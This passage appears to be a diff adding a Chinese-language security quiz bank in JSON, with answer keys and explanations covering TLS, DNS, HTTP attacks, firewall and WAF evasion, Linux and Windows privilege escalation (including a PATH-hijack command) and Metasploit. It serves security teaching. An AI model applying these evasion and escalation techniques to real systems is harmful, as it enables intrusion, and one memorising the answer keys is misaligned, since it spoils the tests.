+      "answer": 1,
+      "explanation": "前向保密通过每次连接使用临时密钥对（ECDHE/DHE）实现。连接结束后临时密钥被销毁。即使攻击者录制了所有流量，后来获得了服务器长期私钥，也只能验证身份（签名），无法计算每次连接的临时共享密钥，因此无法解密历史流量。NSA 大规模收集加密流量正是前向保密要防御的场景。"
+    },
+    {
+      "question": "TLS 1.3 的 0-RTT 恢复有什么安全风险？",
+      "options": [
+        "速度太慢",
+        "0-RTT 数据没有前向保密性，且可能被重放攻击",
+        "不支持加密",
+        "需要额外证书"
+      ],
+      "answer": 1,
+      "explanation": "0-RTT 允许客户端在第一个包中发送应用数据（使用预共享密钥加密），但：1) 没有前向保密——如果 PSK 泄露，早期数据可被解密；2) 重放攻击——攻击者可以截获并重发 0-RTT 数据。因此 0-RTT 只应用于幂等操作（如 GET 请求），不应用于非幂等操作（如转账）。"
+    },
+    {
+      "question": "2014 年的 Heartbleed 漏洞影响的是什么？",
+      "options": [
+        "TLS 协议设计本身",
+        "OpenSSL 的心跳扩展实现——缓冲区读取越界导致服务器内存泄露（可能包含私钥）",
+        "RSA 算法有缺陷",
+        "AES 加密被破解"
+      ],
+      "answer": 1,
+      "explanation": "Heartbleed 不是协议设计问题，而是 OpenSSL 代码实现中的 bug。心跳扩展允许发送一个数据包并请求回复，OpenSSL 没有验证长度字段就复制了指定长度的内存。攻击者可以请求 64KB 的内存块，其中可能包含服务器私钥、用户密码、会话数据等敏感信息。这影响了全球约 17% 的 HTTPS 服务器。"
+    },
+    {
+      "question": "TLS 1.3 中密钥推导使用的 HKDF 层次化结构有什么安全优势？",
+      "options": [
+        "计算更快",
+        "每个阶段使用独立密钥——握手密钥泄露不影响应用密钥，前向密钥泄露不影响后续密钥",
+        "减少密钥长度",
+        "简化实现"
+      ],
+      "answer": 1,
+      "explanation": "TLS 1.3 的密钥推导通过 HKDF 层次化进行：Early Secret → Handshake Secret → Master Secret，每个阶段派生出独立的流量密钥。这种设计的优势是密钥隔离——即使某一阶段的密钥泄露，其他阶段的密钥仍然安全。每次密钥更新后，旧密钥可以被安全销毁。"
+    }
+  ],
+  "crypto-06-02": [
+    {
+      "question": "证书透明（Certificate Transparency）的核心思想是什么？",
+      "options": [
+        "加密所有证书",
+        "要求所有签发的证书记录在公开的、仅追加的 Merkle 树日志中，使任何可疑证书可被检测和审计",
+        "减少 CA 数量",
+        "用区块链替代 CA"
+      ],
+      "answer": 1,
+      "explanation": "CT 的核心是让 CA 的行为透明化：每个签发的证书必须提交到公开的 CT 日志（基于 Merkle 树的仅追加数据结构），日志返回 SCT（签名证书时间戳）作为收录证明。域名所有者和公众可以监控日志，发现未经授权的证书。Chrome 从 2018 年起强制要求所有新证书有 SCT。"
+    },
+    {
+      "question": "HPKP（HTTP Public Key Pinning）被所有浏览器弃用的根本原因是什么？",
+      "options": [
+        "安全强度不够",
+        "操作风险太高——如果丢失备份密钥，所有缓存了 pin 的用户将永远无法访问网站（自锁问题）",
+        "实现太复杂",
+        "性能太差"
+      ],
+      "answer": 1,
+      "explanation": "HPKP 允许网站声明'只接受特定公钥的证书'。但如果网站丢失了所有 pin 的密钥且 pin 还没过期（max-age 内），所有已缓存 pin 的浏览器将永远拒绝连接——这就是'自锁'问题。此外，攻击者还可以恶意设置 pin 来锁定网站。由于运维风险远大于安全收益，Chrome 在 2018 年移除了 HPKP。"
+    },
+    {
+      "question": "CAA（Certificate Authority Authorization）DNS 记录的作用是什么？",
+      "options": [
+        "加密 DNS 查询",
+        "让域名所有者声明哪些 CA 被授权为其域名签发证书，减少不诚实 CA 签发伪造证书的风险",
+        "存储 SSL 证书",
+        "加速证书验证"
+      ],
+      "answer": 1,
+      "explanation": "CAA 让域名所有者在 DNS 中声明授权策略，如 '只有 Let's Encrypt 和 DigiCert 可以为 example.com 签发证书'。CA 在签发证书前必须查询 CAA 记录，如果不在授权列表中则拒绝签发。这是减少 CA 信任面的一种有效机制。"
+    },
+    {
+      "question": "CT 日志使用什么数据结构来确保证书一旦记录就不可被篡改或删除？",
+      "options": [
+        "哈希链表",
+        "仅追加的 Merkle 树（Append-only Merkle Tree）——任何修改都会改变根哈希，可被审计器检测",
+        "B+ 树",
+        "布隆过滤器"
+      ],
+      "answer": 1,
+      "explanation": "CT 日志是仅追加的 Merkle 树：每个新证书作为叶子节点加入，内部节点是子节点的哈希。日志服务器签名承诺根哈希。审计器可以验证：1) 任何已承诺的证书确实在树中（包含证明）；2) 树的历史没有被修改（一致性证明）。任何篡改都会导致 Merkle 证明失败。"
+    },
+    {
+      "question": "2017 年 Symantec（赛门铁克）被 Chrome 不信任的原因是什么？",
+      "options": [
+        "Symantec 的加密算法被破解",
+        "Symantec 在数年间签发了超过 30,000 个不合规证书，包括未经域名授权签发和将权限外包给不明第三方",
+        "Symantec 收费太高",
+        "Symantec 不支持 TLS 1.3"
+      ],
+      "answer": 1,
+      "explanation": "Google 调查发现 Symantec 存在系统性违规：未经授权签发证书、将签发权限外包给不知名第三方、签发不属于 Symantec 的测试域名证书等。Google 最终宣布 Chrome 逐步不信任所有 Symantec 证书。Symantec 的 CA 业务以约 10 亿美元卖给了 DigiCert。这是 CA 治理的标志性事件。"
+    },
+    {
+      "question": "Expect-CT 相比 HPKP 的优势是什么？",
+      "options": [
+        "Expect-CT 提供更强的加密",
+        "Expect-CT 不限制特定公钥（无自锁风险），而是要求浏览器验证证书是否记录在 CT 日志中",
+        "Expect-CT 更快",
+        "Expect-CT 不需要 HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "Expect-CT 是 HPKP 的'温和'替代：它不 pin 特定公钥（避免自锁问题），而是告诉浏览器'请检查这个域名的证书是否在 CT 日志中'。如果证书不在 CT 日志中，浏览器可以拒绝连接或发送报告。这既能检测可疑证书，又不会因为密钥丢失导致网站不可访问。可以先用 report-only 模式逐步部署。"
+    }
+  ],
+  "network": [
+    {
+      "question": "在 TCP/IP 四层模型中，当浏览器发起 HTTP 请求时，数据封装的正确顺序是？",
+      "options": [
+        "网络接口层 → 网际层 → 传输层 → 应用层",
+        "应用层 → 传输层 → 网际层 → 网络接口层",
+        "传输层 → 应用层 → 网络接口层 → 网际层",
+        "网际层 → 传输层 → 应用层 → 网络接口层"
+      ],
+      "answer": 1,
+      "explanation": "数据封装从上到下：应用层产生 HTTP 数据 → 传输层添加 TCP 头部（端口、序列号）→ 网际层添加 IP 头部（IP 地址）→ 网络接口层添加 Ethernet 帧头（MAC 地址）。接收方从下到上逐层解封装。"
+    },
+    {
+      "question": "在 IP 头部中，TTL（Time To Live）字段每经过一个路由器会怎样？攻击者如何利用这一点？",
+      "options": [
+        "TTL 加 1，用于追踪路由路径",
+        "TTL 减 1，减到 0 时丢弃；攻击者可通过 TTL 值推断操作系统类型",
+        "TTL 保持不变，只用于加密",
+        "TTL 翻倍，用于负载均衡"
+      ],
+      "answer": 1,
+      "explanation": "TTL 每经过一个路由器减 1，防止数据包无限循环。不同操作系统有默认 TTL 值（Linux=64，Windows=128），攻击者可以通过 ping 响应中的 TTL 推断目标操作系统，为后续针对性攻击做准备。这也是 traceroute 的工作原理。"
+    },
+    {
+      "question": "Ethernet 的默认 MTU 是 1500 字节。TCP 连接的 MSS（最大段大小）通常是多少？",
+      "options": [
+        "1500 字节",
+        "1460 字节",
+        "1480 字节",
+        "1024 字节"
+      ],
+      "answer": 1,
+      "explanation": "MSS = MTU - IP 头部(20字节) - TCP 头部(20字节) = 1500 - 20 - 20 = 1460 字节。MSS 表示每个 TCP 段中应用层数据的最大长度。在 TCP 三次握手时双方会交换 MSS 值。"
+    },
+    {
+      "question": "当数据包经过路由器转发时，以下哪个字段会被替换？",
+      "options": [
+        "源 IP 地址和目标 IP 地址",
+        "源 MAC 地址和目标 MAC 地址",
+        "TCP 序列号和确认号",
+        "HTTP Host 头部"
+      ],
+      "answer": 1,
+      "explanation": "路由器工作在网际层，它会替换数据链路层的 MAC 地址（源 MAC 改为路由器的出口 MAC，目标 MAC 改为下一跳的 MAC），但保持 IP 地址不变。这就是 MAC 只在本地网络有效、而 IP 可以跨网络路由的原因。"
+    },
+    {
+      "question": "在 Wireshark hex dump 中，IP 头部的 Protocol 字段值为 0x06 表示什么？",
+      "options": [
+        "UDP",
+        "ICMP",
+        "TCP",
+        "HTTP"
+      ],
+      "answer": 2,
+      "explanation": "Protocol 字段标识 IP 数据包的上层协议：6=TCP，17=UDP，1=ICMP。HTTP 是应用层协议，不会出现在 IP 头部的 Protocol 字段中。"
+    },
+    {
+      "question": "ARP 欺骗（ARP Spoofing）攻击利用了网络接口层的什么特性？",
+      "options": [
+        "IP 地址可以被伪造",
+        "ARP 协议不验证回复的真实性，攻击者可以发送伪造的 MAC-IP 映射",
+        "MAC 地址可以跨网络路由",
+        "Ethernet 帧头不包含校验和"
+      ],
+      "answer": 1,
+      "explanation": "ARP 协议没有认证机制，局域网中的任何设备都可以发送 ARP 回复。攻击者发送伪造的 ARP 回复，声称自己的 MAC 地址对应目标 IP，从而实施中间人攻击。防御方法包括静态 ARP 绑定和 802.1X 端口安全。"
+    }
+  ],
+  "net-01-02": [
+    {
+      "question": "TCP 三次握手中，第二步服务器 SYN/ACK 包中的 Ack 值等于什么？",
+      "options": [
+        "服务器自己的初始序列号（ISN）",
+        "客户端初始序列号 + 1",
+        "服务器初始序列号 + 1",
+        "0"
+      ],
+      "answer": 1,
+      "explanation": "Ack 值 = 对方 Seq + 1，表示'我已收到你的 SYN（Seq=N），期待你下一个包从 N+1 开始'。这是 TCP 可靠传输和有序传输的基础机制。"
+    },
+    {
+      "question": "SYN Flood 攻击利用了三次握手中服务器的哪个行为？",
+      "options": [
+        "服务器在发送 SYN/ACK 前不检查客户端身份",
+        "服务器在收到 SYN 后就创建半连接并分配资源，但攻击者永远不发 ACK",
+        "三次握手需要太长时间",
+        "客户端的 ISN 总是可预测的"
+      ],
+      "answer": 1,
+      "explanation": "服务器收到 SYN 后会创建半连接数据结构并分配内存。攻击者发送大量 SYN 包（通常伪造源 IP）但不完成握手，半连接队列被填满后，合法用户的 SYN 请求被丢弃，服务拒绝。"
+    },
+    {
+      "question": "SYN Cookie 防御 SYN Flood 的核心思想是什么？",
+      "options": [
+        "丢弃所有 SYN 包",
+        "不立即分配资源，而是将连接信息编码到 ISN 中，仅在收到合法 ACK 后建立连接",
+        "封禁所有发送 SYN 的 IP",
+        "将半连接队列大小增加到无限"
+      ],
+      "answer": 1,
+      "explanation": "SYN Cookie 将源 IP、端口、目标 IP、端口等信息和时间戳的 Hash 编码到 ISN 中。服务器不预先分配资源，只在收到 ACK 后通过重新计算 Hash 验证合法性，验证通过才正式建立连接。"
+    },
+    {
+      "question": "TCP 四次挥手中，主动关闭方进入 TIME_WAIT 状态的主要目的是？",
+      "options": [
+        "等待服务器确认断开",
+        "确保迟到的数据包不被新连接误收，以及确保最后的 ACK 能送达",
+        "让客户端保存数据",
+        "让路由器更新路由表"
+      ],
+      "answer": 1,
+      "explanation": "TIME_WAIT 持续 2*MSL（通常 60 秒），目的有二：1) 确保主动关闭方发送的最后一个 ACK 能到达对方（如果丢失对方会重发 FIN）；2) 让网络中该连接的残留数据包消亡，防止被复用同一端口的新连接误收。"
+    },
+    {
+      "question": "以下哪个 Wireshark 过滤器能检测可能的 SYN 端口扫描？",
+      "options": [
+        "tcp.port == 80",
+        "tcp.flags.syn == 1",
+        "tcp.flags.syn == 1 and tcp.flags.ack == 0",
+        "tcp.flags.reset == 1"
+      ],
+      "answer": 2,
+      "explanation": "纯 SYN 包（SYN=1 且 ACK=0）是连接请求的第一步。端口扫描工具向多个端口发送纯 SYN 包探测。如果同一源 IP 在短时间内向多个不同目标端口发送纯 SYN 包，则很可能是端口扫描。"
+    },
+    {
+      "question": "RST（Reset）包不会在以下哪种场景中被触发？",
+      "options": [
+        "向未监听端口发送 SYN",
+        "正常完成四次挥手关闭连接",
+        "向已关闭的连接发送数据",
+        "半打开连接超时"
+      ],
+      "answer": 1,
+      "explanation": "正常的四次挥手使用 FIN 包优雅关闭，不触发 RST。RST 是暴力断连方式，在向未开放端口发 SYN、向已关闭连接发数据、应用崩溃等异常情况下触发。RST 注入也是攻击者中断合法连接的手段。"
+    }
+  ],
+  "net-02": [
+    {
+      "question": "Wireshark 捕获过滤器和显示过滤器的核心区别是什么？",
+      "options": [
+        "捕获过滤器精度更高",
+        "捕获过滤器在抓包时过滤（不可逆），显示过滤器在显示时过滤（可随时切换）",
+        "捕获过滤器只能按端口过滤",
+        "两者完全相同，只是语法不同"
+      ],
+      "answer": 1,
+      "explanation": "捕获过滤器（BPF 语法）在数据包到达网卡时就过滤，不匹配的包直接丢弃不保存——无法恢复。显示过滤器在已保存的数据上筛选，可随时修改条件，更加灵活。两者语法也完全不同。"
+    },
+    {
+      "question": "要查找所有目标端口 80 的纯 SYN 包（不含 SYN/ACK），最精确的过滤器是？",
+      "options": [
+        "tcp.port == 80",
+        "tcp.flags.syn == 1",
+        "tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.dstport == 80",
+        "http.request"
+      ],
+      "answer": 2,
+      "explanation": "需要三个条件同时满足：SYN=1（是连接请求）、ACK=0（不是响应）、目标端口=80（发往 HTTP 服务）。tcp.port == 80 太宽泛，会匹配源端口或目标端口；http.request 是应用层过滤器。"
+    },
+    {
+      "question": "Wireshark Expert Information 面板中大量 'TCP Retransmission' 警告通常意味着什么？",
+      "options": [
+        "一定存在中间人攻击",
+        "网络质量差，存在丢包或拥塞",
+        "服务器遭受 DDoS",
+        "客户端 TCP 实现有 bug"
+      ],
+      "answer": 1,
+      "explanation": "TCP 重传表示未收到对方 ACK 而重发数据。少量重传正常，大量重传通常表示网络丢包或拥塞。虽然中间人攻击也可能导致重传，但最常见原因还是网络质量问题。"
+    },
+    {
+      "question": "追踪一次完整 HTTP 会话的正确数据包顺序是？",
+      "options": [
+        "HTTP GET → TCP 握手 → DNS 查询 → HTTP 响应",
+        "DNS 查询 → HTTP GET → TCP 握手 → HTTP 响应",
+        "DNS 查询 → TCP 三次握手 → HTTP GET → HTTP 响应",
+        "TCP 握手 → DNS 查询 → HTTP GET → HTTP 响应"
+      ],
+      "answer": 2,
+      "explanation": "正确顺序：1) DNS 查询获取服务器 IP → 2) TCP 三次握手建立连接 → 3) HTTP GET 发送请求 → 4) HTTP 响应返回数据。浏览器必须先知道 IP 才能建立 TCP 连接。"
+    },
+    {
+      "question": "tshark 命令中，'-T fields -e http.request.uri' 参数的作用是？",
+      "options": [
+        "保存 pcap 文件",
+        "按指定字段格式输出（如只输出请求 URI）",
+        "设置捕获过滤器",
+        "显示完整的协议解析"
+      ],
+      "answer": 1,
+      "explanation": "-T fields 指定输出为字段格式（而非默认的包摘要），-e 指定要输出的字段。组合使用可以精确提取特定协议字段的数据，非常适合批量分析和脚本化处理。"
+    },
+    {
+      "question": "Wireshark 的 'Follow TCP Stream' 功能做什么？",
+      "options": [
+        "只显示三次握手包",
+        "将同一 TCP 连接的所有数据按序列号重组并用颜色区分方向显示",
+        "解密 TLS 流量",
+        "统计带宽使用量"
+      ],
+      "answer": 1,
+      "explanation": "Follow TCP Stream 自动识别同一 TCP 连接（相同四元组：源IP、源端口、目标IP、目标端口）的所有包，按序列号顺序重组数据，红色显示客户端数据，蓝色显示服务器数据。是分析完整会话最直观的方法。"
+    }
+  ],
+  "net-03": [
+    {
+      "question": "递归查询和迭代查询在 DNS 解析中的区别是什么？",
+      "options": [
+        "递归查询更快",
+        "递归查询要求 DNS 服务器代为查询到底返回最终答案，迭代查询只返回下一步指引由查询方继续追踪",
+        "递归查询用 TCP，迭代查询用 UDP",
+        "两者完全相同"
+      ],
+      "answer": 1,
+      "explanation": "客户端到本地 DNS 通常使用递归查询（要求返回最终答案），本地 DNS 到根/TLD/权威服务器使用迭代查询（只返回'去问这个服务器'的指引）。递归查询将工作量交给了 DNS 服务器。"
+    },
+    {
+      "question": "DNS 缓存投毒攻击成功需要猜对哪两个值？",
+      "options": [
+        "源 IP 和目标 IP",
+        "Transaction ID 和 UDP 源端口",
+        "DNS 服务器的 MAC 地址",
+        "域名的 TTL 值"
+      ],
+      "answer": 1,
+      "explanation": "Transaction ID（16 bit，65536 种可能）和 UDP 源端口（16 bit，65536 种可能）都需要匹配。总共约 43 亿种组合。攻击者通过发送大量伪造响应来暴力猜中。源端口随机化是有效的防御手段。"
+    },
+    {
+      "question": "DNS 放大攻击利用了哪两个特性？",
+      "options": [
+        "DNS 使用 TCP 和加密",
+        "DNS 响应远大于查询（ANY 记录可达 66 倍放大），且 UDP 允许伪造源 IP",
+        "DNS 只支持 A 记录查询",
+        "DNS 服务器自动转发所有请求"
+      ],
+      "answer": 1,
+      "explanation": "DNS 放大攻击利用：1) 响应放大——ANY 查询的响应可达查询的 66 倍大；2) UDP 无连接特性允许伪造源 IP，将攻击流量导向受害者。1Mbps 攻击流量可产生约 66Mbps 的反射攻击。"
+    },
+    {
+      "question": "哪种 Wireshark 过滤器最适合检测 DNS 隧道？",
+      "options": [
+        "dns.qry.type == 1",
+        "udp.port == 53",
+        "dns.qry.name.len > 50",
+        "dns.response.code == 0"
+      ],
+      "answer": 2,
+      "explanation": "DNS 隧道将数据编码到子域名中，导致查询名称异常长（通常超过 50 字符）。正常域名很少有这么长的标签。dns.qry.name.len > 50 可有效筛选可疑的长域名查询。"
+    },
+    {
+      "question": "子域名接管（Subdomain Takeover）攻击的前提条件是什么？",
+      "options": [
+        "DNS 服务器被入侵",
+        "CNAME 记录指向已释放或不再使用的第三方服务",
+        "网站使用 HTTP 而非 HTTPS",
+        "DNS 服务器未部署 DNSSEC"
+      ],
+      "answer": 1,
+      "explanation": "当 CNAME 记录指向已被删除的第三方服务（如已注销的 GitHub Pages、已释放的 S3 存储桶）时，攻击者注册同名服务即可接管该子域名。防御方法：定期审计 CNAME 记录，删除指向无效目标的记录。"
+    },
+    {
+      "question": "DNSSEC 主要解决 DNS 的哪个安全问题？",
+      "options": [
+        "DNS 查询被窃听",
+        "DNS 响应被伪造（缓存投毒），通过数字签名验证响应的真实性",
+        "DNS 查询速度慢",
+        "DNS 不支持 IPv6"
+      ],
+      "answer": 1,
+      "explanation": "DNSSEC 通过数字签名（RRSIG）和公钥（DNSKEY）建立从根区到域名的信任链，验证 DNS 响应的真实性。但它不加密查询内容（不能防窃听），也不提升查询速度。DoH/DoT 用于加密 DNS 查询。"
+    }
+  ],
+  "net-04": [
+    {
+      "question": "HTTP 响应头 Strict-Transport-Security（HSTS）的主要作用是什么？",
+      "options": [
+        "加密 HTTP 内容",
+        "强制浏览器在指定时间内只使用 HTTPS 访问该站点，防止 SSL Strip 降级攻击",
+        "防止 CSRF 攻击",
+        "限制 CORS 跨域请求"
+      ],
+      "answer": 1,
+      "explanation": "HSTS 告诉浏览器在 max-age 期间内（通常一年）对该域名强制使用 HTTPS。即使用户输入 http:// 也会被浏览器自动升级为 https://。这有效防止了 SSL Strip 攻击（中间人将 HTTPS 链接降级为 HTTP）。"
+    },
+    {
+      "question": "HTTP 请求走私（Request Smuggling）攻击的核心原理是什么？",
+      "options": [
+        "HTTP 协议不加密",
+        "前端代理和后端服务器对请求边界的判定方式不一致（如 CL vs TE）",
+        "浏览器发送了畸形的请求",
+        "服务器不支持 HTTP/2"
+      ],
+      "answer": 1,
+      "explanation": "当前端用 Content-Length 判断请求长度，后端用 Transfer-Encoding: chunked 判断（或反之），攻击者构造歧义请求，使前后端看到不同的请求边界。走私的请求可绕过 WAF 认证、窃取其他用户数据、或投毒缓存。"
+    },
+    {
+      "question": "TLS 握手中 SNI（Server Name Indication）的安全问题是什么？",
+      "options": [
+        "导致证书验证失败",
+        "在 Client Hello 中明文传输，暴露用户访问的域名",
+        "只支持 IPv4",
+        "增加握手延迟"
+      ],
+      "answer": 1,
+      "explanation": "即使使用 HTTPS 加密，TLS Client Hello 中的 SNI 仍是明文。ISP 或中间人可以看到你访问的域名（虽然不知道具体 URL）。这就是为什么 ESNI/ECH（加密 SNI）正在被推广。"
+    },
+    {
+      "question": "HTTP 头注入（CRLF Injection）中，%0d%0a 代表什么？",
+      "options": [
+        "空字符（Null byte）",
+        "回车换行符（\\r\\n），是 HTTP 头部的分隔符",
+        "URL 分隔符",
+        "Base64 编码标记"
+      ],
+      "answer": 1,
+      "explanation": "%0d%0a 是 URL 编码的 CRLF（\\r\\n）。HTTP 用 CRLF 分隔头部字段，攻击者在用户输入中注入 CRLF 可在响应中插入新头部（如 Set-Cookie），实现 Cookie 注入、XSS 或缓存投毒。"
+    },
+    {
+      "question": "TRACE HTTP 方法为什么应该在生产环境中禁用？",
+      "options": [
+        "它会消耗大量服务器资源",
+        "它将请求原样返回，可被用于跨站追踪（XST）窃取 Cookie",
+        "它不支持 HTTPS",
+        "它会导致缓存失效"
+      ],
+      "answer": 1,
+      "explanation": "TRACE 方法将收到的请求（包括所有头部）原样返回给客户端。攻击者结合 XSS 可利用 TRACE 窃取用户的认证 Cookie 和其他敏感头部，这就是 XST（Cross-Site Tracing）攻击。"
+    },
+    {
+      "question": "以下哪个不是安全相关的 HTTP 响应头？",
+      "options": [
+        "Content-Security-Policy",
+        "X-Frame-Options",
+        "Content-Type",
+        "X-Content-Type-Options"
+      ],
+      "answer": 2,
+      "explanation": "Content-Type 是标准 HTTP 头，声明响应体的 MIME 类型，不是安全头。CSP 防 XSS，X-Frame-Options 防点击劫持，X-Content-Type-Options 防 MIME 混淆——三者都是安全响应头。"
+    }
+  ],
+  "net-05": [
+    {
+      "question": "IP 分片绕过防火墙的基本原理是什么？",
+      "options": [
+        "加密数据包使防火墙无法解密",
+        "将攻击特征拆分到多个小片段中，每个片段单独不含完整签名",
+        "增大 TTL 使包在到达防火墙前丢弃",
+        "使用 UDP 代替 TCP"
+      ],
+      "answer": 1,
+      "explanation": "IP 分片将包含攻击特征的包拆成多个片段。如果 IDS/防火墙不做分片重组就直接匹配签名，每个片段都不包含完整的攻击特征字符串，从而绕过检测。防御方法是在 IDS 层面先进行分片重组再做签名匹配。"
+    },
+    {
+      "question": "DNS 隧道能绕过防火墙的主要原因是什么？",
+      "options": [
+        "DNS 流量被加密了",
+        "防火墙通常必须允许 DNS 流量（端口 53）通过",
+        "DNS 使用 TCP 协议",
+        "DNS 数据包太小不被检查"
+      ],
+      "answer": 1,
+      "explanation": "防火墙必须放行 DNS 流量（否则无法解析域名），攻击者利用这个'白名单通道'将数据编码到 DNS 查询的子域名或 TXT 记录响应中。防御需要深度包检测（DPI）和行为分析，而非简单的端口规则。"
+    },
+    {
+      "question": "Nmap 的 -D 参数（诱饵扫描）如何工作？",
+      "options": [
+        "加速扫描过程",
+        "同时使用多个伪造 IP 和真实 IP 发送探测包，使目标无法确定真实攻击者",
+        "绕过防火墙分片检测",
+        "自动选择最优端口"
+      ],
+      "answer": 1,
+      "explanation": "-D 参数让 Nmap 用诱饵 IP 和真实 IP 同时发送探测包。目标日志中出现多个源 IP 的扫描记录，无法区分哪个是真实攻击者。这增加了溯源难度但不阻止 IDS 检测到扫描行为本身。"
+    },
+    {
+      "question": "防火墙规则审计中最常见的安全隐患是什么？",
+      "options": [
+        "规则数量太多",
+        "缺少默认拒绝（Default Deny）规则，未明确禁止的流量被放行",
+        "规则更新太频繁",
+        "使用了状态检测"
+      ],
+      "answer": 1,
+      "explanation": "没有默认拒绝规则意味着任何未被明确禁止的流量都会被放行。攻击者可以利用未覆盖的端口或协议绕过防火墙。最佳实践是在规则末尾添加 DENY ALL 兜底规则。"
+    },
+    {
+      "question": "WAF 绕过中 HTTP 参数污染（HPP）的原理是什么？",
+      "options": [
+        "发送超大参数值导致 WAF 崩溃",
+        "发送同名但值不同的多个参数，WAF 和后端应用可能解析不同的参数值",
+        "使用加密参数绕过检测",
+        "用 POST 替代 GET 方法"
+      ],
+      "answer": 1,
+      "explanation": "HPP 利用 WAF 和后端对同名重复参数的处理差异。WAF 可能只检查第一个参数值（安全），后端使用最后一个（恶意）。攻击载荷在 WAF 检查时被忽略但在后端被执行。"
+    },
+    {
+      "question": "防御深度（Defense in Depth）策略的核心理念是什么？",
+      "options": [
+        "只使用一种最强的防火墙",
+        "部署多层防线（防火墙 + IDS + WAF + 应用验证），确保一层被绕过时其他层仍可检测和阻止攻击",
+        "只依赖 IDS 进行检测",
+        "关闭所有端口禁止所有流量"
+      ],
+      "answer": 1,
+      "explanation": "纵深防御部署多层安全控制，每层独立运作。即使攻击者绕过防火墙，IDS 仍可检测；即使 IDS 被规避，WAF 仍可拦截；即使 WAF 被绕过，应用层验证仍可阻止恶意输入。没有单一防御是完美的，多层防御提高攻击成本。"
+    }
+  ],
+  "pentest-01-01": [
+    {
+      "question": "在渗透测试中，以下哪项属于被动侦察（不直接接触目标系统）？",
+      "options": [
+        "使用 nmap 进行全端口扫描",
+        "使用 ffuf 进行目录枚举",
+        "通过 crt.sh 查询 SSL 证书透明度日志发现子域名",
+        "使用 Nikto 进行 Web 漏洞扫描"
+      ],
+      "answer": 2,
+      "explanation": "crt.sh 查询 SSL 证书透明度日志是被动侦察，因为它只查询公开的证书日志数据库，不会与目标系统建立任何连接。而 nmap、ffuf、Nikto 都会直接向目标发送数据包，属于主动侦察。"
+    },
+    {
+      "question": "通过 nmap 扫描发现目标的 MySQL 3306 端口直接暴露在公网，以下哪种说法最准确？",
+      "options": [
+        "这是正常配置，MySQL 需要公网访问才能工作",
+        "这是一个高风险配置，数据库不应该直接暴露在公网",
+        "只要设置了强密码，暴露在公网也没问题",
+        "MySQL 端口暴露只有在 Windows 系统上才是风险"
+      ],
+      "answer": 1,
+      "explanation": "数据库端口（如 MySQL 3306）直接暴露在公网是高风险配置。即使设置了强密码，也可能面临暴力破解、已知漏洞利用等风险。正确的做法是将数据库放在内网，仅允许应用服务器访问。"
+    },
+    {
+      "question": "在目录枚举中发现目标的 .git/HEAD 文件可访问，这意味着什么？",
+      "options": [
+        "目标使用了 Git 进行开发，但没有安全问题",
+        "整个 Git 仓库可能被下载，导致源代码和敏感信息泄露",
+        "这只是 Git 的安装标记文件，没有实际价值",
+        "只有 HEAD 文件可用，无法获取完整仓库"
+      ],
+      "answer": 1,
+      "explanation": ".git 目录暴露是严重的安全问题。攻击者可以使用 git-dumper 等工具下载完整的 Git 仓库，获取源代码、提交历史、配置文件中可能包含的密钥和密码。这被标记为 CRITICAL 级别发现。"
+    }
+  ],
+  "pentest-02-01": [
+    {
+      "question": "在 Linux 系统上，你以 www-data 用户获得了一个 shell。通过 LinPEAS 发现一个 SUID 程序调用了 tar 但没有使用绝对路径。你应该如何提权？",
+      "options": [
+        "直接运行该 SUID 程序并等待它自动提权",
+        "在 PATH 前面添加一个包含恶意 tar 脚本的目录，然后运行该 SUID 程序",
+        "使用 sudo 以 root 权限运行该程序",
+        "修改 SUID 程序的源代码来添加后门"
+      ],
+      "answer": 1,
+      "explanation": "这是经典的 PATH 劫持攻击。当 SUID 程序调用 tar 但没有使用绝对路径（如 /bin/tar）时，系统会按照 PATH 环境变量的顺序查找可执行文件。我们在 /tmp 下创建一个恶意的 tar 脚本，然后通过 export PATH=/tmp:$PATH 让 SUID 程序优先执行我们的恶意版本。"
+    },
+    {
+      "question": "在 Windows 系统上，你发现当前用户拥有 SeImpersonatePrivilege 权限。以下哪种攻击最可能直接提权到 SYSTEM？",
+      "options": [
+        "修改注册表中的服务路径",
+        "使用 PrintSpoofer 或 JuicyPotato 工具",
+        "暴力破解管理员密码",
+        "利用 SMB 漏洞"
+      ],
+      "answer": 1,
+      "explanation": "SeImpersonatePrivilege 允许进程模拟其他用户身份。PrintSpoofer 和 JuicyPotato 等工具正是利用这个权限来创建 SYSTEM 级别的令牌并执行任意命令。这是 Windows Web 服务账户最常见的提权路径之一。"
+    },
+    {
+      "question": "以下哪种提权方式的风险最高，可能导致系统崩溃？",
+      "options": [
+        "Cron Job 劫持",
+        "PATH 环境变量劫持",
+        "Linux 内核漏洞利用",
+        "从配置文件中获取明文密码"
+      ],
+      "answer": 2,
+      "explanation": "内核漏洞利用直接在操作系统内核层面操作，如果利用失败可能导致内核 panic（系统崩溃）、数据丢失或系统不稳定。相比之下，PATH 劫持、Cron Job 劫持和凭证利用都是在用户空间操作，失败也不会导致系统崩溃。因此内核漏洞利用通常作为最后的手段。"
+    }
+  ],
+  "pentest-03-01": [
+    {
+      "question": "在 Metasploit 中，Meterpreter Payload 与普通命令行 Shell 相比，最大的优势是什么？",
+      "options": [
+        "Meterpreter 运行速度更快",
+        "Meterpreter 运行在内存中不落地磁盘，并提供丰富的后渗透功能",
+        "Meterpreter 不会被任何杀毒软件检测到",
+        "Meterpreter 只能在 Windows 上使用"
+      ],
+      "answer": 1,
+      "explanation": "Meterpreter 是 Metasploit 的高级 Payload，它完全运行在目标内存中，不会在磁盘上留下文件（减少被检测的痕迹）。它提供了文件操作、进程管理、网络探测、键盘记录等丰富的后渗透功能，远超基础命令行 Shell。"
+    },
+    {
+      "question": "Metasploit 中的 Pivoting（枢纽）功能用于什么场景？",
+      "options": [
+        "加密与目标之间的通信",
+        "通过已控制的机器作为跳板，访问内部网络中其他不可直达的主机",
+        "同时攻击多个目标",
+        "将 Payload 编码为不同格式"
+      ],
+      "answer": 1,
+      "explanation": "Pivoting 是通过已控制的机器（跳板）设置路由，使得攻击者可以通过该机器访问内部网络中原本无法直接到达的主机。例如，通过外网 Web 服务器访问内网的数据库服务器。这是渗透测试中非常重要的技术，使得攻击者能够从外部逐步深入到内部网络。"
+    },
+    {
+      "question": "关于 Metasploit 的资源脚本（Resource Scripts），以下哪个描述是正确的？",
+      "options": [
+        "资源脚本只能手动在 msfconsole 中逐行输入",
+        "资源脚本可以将重复性的操作写成脚本文件，通过 -r 参数一键执行",
+        "资源脚本只能用于漏洞利用，不能用于扫描",
+        "资源脚本使用 Python 语言编写"
+      ],
